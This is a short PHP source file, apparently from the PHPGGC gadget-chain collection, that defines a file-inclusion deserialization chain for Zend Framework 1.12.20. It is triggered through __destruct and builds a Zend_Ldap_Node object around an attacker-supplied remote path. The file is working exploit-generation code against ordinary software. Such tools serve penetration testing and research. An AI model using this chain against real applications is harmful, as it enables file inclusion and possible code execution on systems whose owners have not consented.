<?php

namespace GadgetChain\ZendFramework;

class FI1 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '1.12.20';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Zend_Ldap_Node($file);
    }
}